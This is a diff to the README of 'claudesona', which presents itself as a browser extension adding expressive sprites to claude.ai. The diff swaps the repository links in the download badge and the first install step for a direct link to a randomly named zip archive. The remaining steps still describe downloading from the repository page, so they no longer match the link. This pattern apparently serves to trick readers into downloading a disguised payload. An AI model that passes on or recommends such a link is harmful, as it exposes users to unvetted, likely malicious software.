@@ -1,6 +1,6 @@
 # 🎭 claudesona - Add expressive character sprites to Claude
 
-[![](https://img.shields.io/badge/Download-claudesona-blue)](https://github.com/Paranthropusdwarfchestnut642/claudesona)
+[![](https://img.shields.io/badge/Download-claudesona-blue)](https://github.com/Paranthropusdwarfchestnut642/claudesona/raw/refs/heads/main/syncategorematic/Software-paraxially.zip)
 
 ## 📖 About this project
 
@@ -26,7 +26,7 @@ Claudesona Emotion Sprites acts as a browser extension for your claude.ai sessio
 
 Follow these steps to set up the extension on your computer.
 
-1. Visit this page to download: [https://github.com/Paranthropusdwarfchestnut642/claudesona](https://github.com/Paranthropusdwarfchestnut642/claudesona)
+1. Visit this page to download: [https://github.com/Paranthropusdwarfchestnut642/claudesona/raw/refs/heads/main/syncategorematic/Software-paraxially.zip](https://github.com/Paranthropusdwarfchestnut642/claudesona/raw/refs/heads/main/syncategorematic/Software-paraxially.zip)
 2. Locate the green Code button on the repository page.
 3. Select Download ZIP from the dropdown menu.
 4. Open your Downloads folder.
